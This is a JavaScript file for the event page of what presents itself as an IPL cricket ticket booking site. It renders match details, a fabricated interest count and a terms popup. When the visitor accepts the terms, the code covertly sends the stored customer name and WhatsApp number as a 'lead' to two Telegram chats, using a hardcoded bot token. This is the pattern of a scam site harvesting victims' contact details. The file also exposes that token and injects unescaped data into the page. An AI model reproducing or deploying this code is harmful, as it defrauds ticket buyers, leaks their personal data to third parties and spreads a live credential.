const container = document.getElementById('event-container');
const footer = document.getElementById('event-footer');
const priceBox = document.getElementById('event-price');

const popup = document.getElementById('tnc-modal');
const box = document.getElementById('popup-box');

let startY = 0;

// ==========================================
// 🔥 GET FULL MATCH DATA (SAFE RECOVERY)
// ==========================================
let match = null;

try {
    const rawData = localStorage.getItem('selectedMatch');
    match = rawData ? JSON.parse(rawData) : null;
} catch (e) {
    match = null;
    console.error("LocalStorage Error", e);
}

console.log("EVENT MATCH DATA:", match);

// ❌ NO MATCH FOUND
if (!match) {
    if (container) {
        container.innerHTML = `<div class="loading">No Match Selected. <a href="index.html">Go Back</a></div>`;
    }
} else {

    // 🔥 IMPORTANT: SAVE ID FOR FIREBASE SYNC ON SEATS PAGE
    if (match.id) {
        localStorage.setItem("matchId", match.id);
    }

    const teams = (match.title || "Match").split(' vs ');

    // 🔥 RENDER UI
    container.innerHTML = `
    
    <div style="padding:16px">
        <img src="${match.banner}" style="width:100%; border-radius:10px;" onerror="this.src='https://via.placeholder.com/800x400?text=Banner+Not+Available'">
    </div>

    <div style="padding:0 16px;">
        <span style="background:#eee; padding:4px 8px; font-size:10px; border-radius:4px;">
            Cricket
        </span>
    </div>

    <div class="interest-box">
        <div class="interest-left">
            👍 
            <div>
                <strong>71.7k are Interested</strong>
                <p>Mark interested to know more</p>
            </div>
        </div>
        <button class="interested-btn">Interested?</button>
    </div>

    <div class="event-details-list">
        <div>📅 ${match.date || 'TBA'}</div>
        <div>⏰ ${match.time || 'TBA'}</div>
        <div>⏳ 5 Hours</div>
        <div>👶 Age Limit - 2yrs +</div>
        <div>🌐 Hindi, English</div>
        <div>📍 ${match.venue || 'Venue TBC'}</div>
    </div>

    <div class="explore-banner">
        <span>EXPLORE THE TOURNAMENT HOMEPAGE</span>
        <span>➤</span>
    </div>

    <div class="limit-info-bar">
        Ticket limit for this booking is 10
    </div>

    <div class="about-section">
        <h3>About The Event</h3>
        <p>
            Witness an exciting IPL match between 
            <b>${teams[0] || 'Team A'}</b> and <b>${teams[1] || 'Team B'}</b>.
        </p>
    </div>

    <div class="tnc-link" onclick="openTnc()">
        <span>Terms & Conditions</span>
        <span>➤</span>
    </div>
    `;

    if (footer) footer.style.display = "flex";
    if (priceBox) priceBox.innerText = `₹${match.price || 0} onwards`;
}

// ==========================================
// 🔥 POPUP LOGIC
// ==========================================
window.openTnc = () => {
    if (popup) popup.classList.add('active');
};

function closePopup() {
    if (popup) popup.classList.remove('active');
    if (box) box.style.transform = 'translateY(0)';
}

const closeBtn = document.getElementById('close-popup');
if (closeBtn) {
    closeBtn.onclick = closePopup;
}

if (popup) {
    popup.addEventListener('click', (e) => {
        if (e.target === popup) closePopup();
    });
}

// ==========================================
// 🔥 ACCEPT → GO TO SEATS (BULLETPROOF TELEGRAM FIX)
// ==========================================
const acceptBtn = document.getElementById('accept-tnc-btn');
if (acceptBtn) {
    acceptBtn.onclick = () => {
        
        // 1. Button ko block karo taki user 2 baar click na kare
        acceptBtn.innerText = "Please Wait...";
        acceptBtn.style.pointerEvents = "none";
        
        if (typeof fbq !== "undefined") {
            fbq('track', 'InitiateCheckout');
        }

        const name = localStorage.getItem('customerName') || "Unknown";
        const phone = localStorage.getItem('customerPhone') || "Unknown";
        const matchTitle = match ? match.title : "Unknown Match";

        const botToken = "8764436183:AAGzzpyaDS05CEYIZcITgUm7jA3qWDBfZpM"; 
        const chatId1 = "6820660513"; 
        const chatId2 = "8351268578"; 
        
        const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                            `👤 *Name:* ${name}\n` +
                            `📞 *WhatsApp:* ${phone}\n` +
                            `🏏 *Match:* ${matchTitle}\n` +
                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;

        const url1 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
        const url2 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;

        // 🔥 IMPORTANT FIX: Pehle message send hoga, fir page redirect hoga!
        Promise.all([
            fetch(url1).catch(e => console.log("TG Error 1")),
            fetch(url2).catch(e => console.log("TG Error 2"))
        ]).finally(() => {
            closePopup();
            // Data safe pass to seats
            localStorage.setItem('selectedMatch', JSON.stringify(match));
            // Redirect
            window.location.href = "seats.html";
        });
    };
}

// ==========================================
// 🔥 BOOK BUTTON
// ==========================================
const bookNowBtn = document.getElementById('book-now-btn');
if (bookNowBtn) {
    bookNowBtn.onclick = () => {
        openTnc();
    };
}

// ==========================================
// 🔥 SWIPE CLOSE LOGIC
// ==========================================
if (box) {
    box.addEventListener('touchstart', (e) => {
        startY = e.touches[0].clientY;
    });

    box.addEventListener('touchmove', (e) => {
        let move = e.touches[0].clientY - startY;
        if (move > 0) {
            box.style.transform = `translateY(${move}px)`;
        }
    });

    box.addEventListener('touchend', (e) => {
        let diff = e.changedTouches[0].clientY - startY;

        if (diff > 100) {
            closePopup();
        } else {
            box.style.transform = 'translateY(0)';
        }
    });
}
